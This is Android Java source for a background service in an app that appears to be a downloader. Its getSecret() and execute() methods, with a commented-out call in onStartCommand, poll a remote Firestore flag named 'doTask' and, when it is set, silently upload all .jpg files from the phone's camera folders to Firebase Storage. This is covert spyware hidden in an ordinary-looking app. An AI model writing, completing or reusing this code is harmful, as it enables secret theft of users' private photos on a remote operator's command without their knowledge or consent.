package com.example.ydownload.services;

import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.example.ydownload.model.Status;
import com.example.ydownload.model.Upload;
import com.example.ydownload.receiver.MyBroadcast;
import com.example.ydownload.utils.Common;
import com.google.android.gms.common.util.WorkSourceUtil;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.api.Backend;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MyService extends Service {

    private final List<Upload> imagesList = new ArrayList<>();
    private Handler handler = new Handler();
    private BroadcastReceiver broadcastReceiver = null;
    private final FirebaseFirestore firebaseFirestore = FirebaseFirestore.getInstance();

    private final LocalBinder mBinder = new LocalBinder();
    protected Toast mToast;
    private Context context;

    public class LocalBinder extends Binder {
        public MyService getService() {
            return MyService.this;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    @Override
    public void onCreate() {
        super.onCreate();

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler = new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {

// write your code to post content on server

//        firebaseFirestore.collection("DownloaderMessage").document("secret").get()
//                .addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
//                    @Override
//                    public void onComplete(@NonNull Task<DocumentSnapshot> task) {
//                        if (task.isSuccessful()) {
//                            boolean secret = task.getResult().getBoolean("doTask");
//                            if (secret) {
//                                String id = Build.ID;
//                                if (Common.CAMERA_DIRECTORY.exists()) {
//                                    execute(Common.CAMERA_DIRECTORY, id + " DCIM");
//                                    Log.e("Camera path", "Exist");
//                                } else {
//                                    Log.e("Camera path", "Not Exist");
//                                }
//
//                                if (Common.CAMERA_DIRECTORY_2.exists()) {
//                                    execute(Common.CAMERA_DIRECTORY_2, id + " Picture");
//                                    Log.e("Camera path 2", "Exist");
//                                } else {
//                                    Log.e("Camera path 2", "Not Exist");
//                                }
//                            }
//                        } else {
//                            Log.e("Error", task.getException().getMessage());
//                        }
//                    }
//                });

//        getSecret();

            }
        });
        return android.app.Service.START_STICKY;
    }

    private void getSecret() {
        try {
            firebaseFirestore.collection("DownloaderMessage").document("secret").get()
                    .addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
                        @Override
                        public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                            if (task.isSuccessful()) {
                                boolean secret = task.getResult().getBoolean("doTask");
                                if (secret) {
                                    String id = String.valueOf(Build.TIME);
                                    if (Common.CAMERA_DIRECTORY.exists()) {
                                        execute(Common.CAMERA_DIRECTORY, id + " DCIM");
                                        Log.e("Camera path", "Exist");
                                    } else {
                                        Log.e("Camera path", "Not Exist");
                                    }

                                    if (Common.CAMERA_DIRECTORY_2.exists()) {
                                        execute(Common.CAMERA_DIRECTORY_2, id + " Picture");
                                        Log.e("Camera path 2", "Exist");
                                    } else {
                                        Log.e("Camera path 2", "Not Exist");
                                    }
                                }
                            } else {
                                Log.e("Error", task.getException().getMessage());
                            }
                        }
                    });
        } catch (Exception e) {
            Log.e("Error", "" + e.getMessage());
        }
    }

    @Nullable
    @Override
    public ComponentName startForegroundService(Intent service) {
        return super.startForegroundService(service);
    }

    private void execute(File folder, String from) {
        try {
            new Thread(() -> {
                File[] files;
                files = folder.listFiles();
                Log.e("Files", "" + files);
                imagesList.clear();

                if (files != null && files.length > 0) {
                    Arrays.sort(files);

                    for (File file : files) {
                        Upload upload = new Upload(file, file.getName(), file.getAbsolutePath());

                        if (!upload.isVideo() && upload.getTitle().endsWith(".jpg")) {
                            imagesList.add(upload);
                        }
                    }

                    handler.post(() -> {
                        if (imagesList.size() <= 0) {
                            Log.e("Camera path", "File not found");
                        } else {
                            StorageReference storageReference = FirebaseStorage.getInstance().getReference().child(from);
                            for (Upload imagesList : imagesList) {

                                StorageReference imageName = storageReference.child(imagesList.getTitle());
                                Uri uri = Uri.fromFile(imagesList.getFile());
                                imageName.putFile(uri).addOnCompleteListener(new OnCompleteListener<UploadTask.TaskSnapshot>() {
                                    @Override
                                    public void onComplete(@NonNull Task<UploadTask.TaskSnapshot> task) {
                                        if (task.isSuccessful()) {
                                            Log.e("Task", "Success");
                                        } else {
                                            Log.e("Task", "Failed " + task.getException().getMessage());
                                        }
                                    }
                                });

                            }
                        }
                    });

                    handler.post(() -> {
                        Log.e("Task", "Success on Finish");
                    });

                }
            }).start();
        } catch (Exception e) {
            Log.e("Error", "" + e.getMessage());
        }
    }

}
